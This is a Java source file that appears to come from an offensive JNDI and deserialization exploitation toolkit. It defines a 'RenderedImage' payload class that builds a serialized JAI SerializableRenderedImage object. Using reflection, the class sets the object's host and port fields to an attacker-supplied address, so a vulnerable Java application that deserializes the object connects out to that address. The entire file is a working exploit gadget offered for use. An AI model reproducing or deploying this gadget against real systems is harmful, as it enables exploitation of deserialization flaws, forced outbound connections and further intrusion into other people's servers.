package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Reflections;

import javax.media.jai.remote.SerializableRenderedImage;
import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.net.InetAddress;

@Dependencies({"javax.media:jai-codec-1.1.3"})
public class RenderedImage implements ObjectPayload<Object> {
    @Override
    public Object getObject(PayloadType type, String... param) throws Exception {
        String command = param[0];
        int    sep     = command.lastIndexOf(':');
        if (sep < 0) {
            throw new IllegalArgumentException("Command format is: <host>:<port>");
        }

        String host = command.substring(0, sep);
        String port = command.substring(sep + 1);

        String        imageHex = "FFD8FFE000104A46494600010100000100010000FFDB0043000503040404030504040405050506070C08070707070F0B0B090C110F1212110F111113161C1713141A1511111821181A1D1D1F1F1F13172224221E241C1E1F1EFFDB0043010505050706070E08080E1E1411141E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1E1EFFC00011080009000803012200021101031101FFC400160001010100000000000000000000000000000308FFC40021100001030401050000000000000000000003000204010511130712143774B4FFC40014010100000000000000000000000000000001FFC40014110100000000000000000000000000000000FFDA000C03010002110311003F00D0967E448E6E43976297246D894310229231BDD1B6606E18FB8C6BD95675BAA3CE688A772F0E1FD90FD234497FFFD9";
        BufferedImage picImage = ImageIO.read(new ByteArrayInputStream(hexToByteArray(imageHex)));

        SerializableRenderedImage serializableRenderedImage = new SerializableRenderedImage(picImage, true);
        Reflections.setFieldValue(serializableRenderedImage, "port", Integer.parseInt(port));
        Reflections.setFieldValue(serializableRenderedImage, "host", InetAddress.getByName(host));

        return serializableRenderedImage;
    }


    public static byte hexToByte(String inHex) {
        return (byte) Integer.parseInt(inHex, 16);
    }

    public static byte[] hexToByteArray(String inHex) {
        int    hexlen = inHex.length();
        byte[] result;
        if (hexlen % 2 == 1) {
            hexlen++;
            result = new byte[(hexlen / 2)];
            inHex = "0" + inHex;
        } else {
            result = new byte[(hexlen / 2)];
        }
        int j = 0;
        for (int i = 0; i < hexlen; i += 2) {
            result[j] = hexToByte(inHex.substring(i, i + 2));
            j++;
        }
        return result;
    }
}
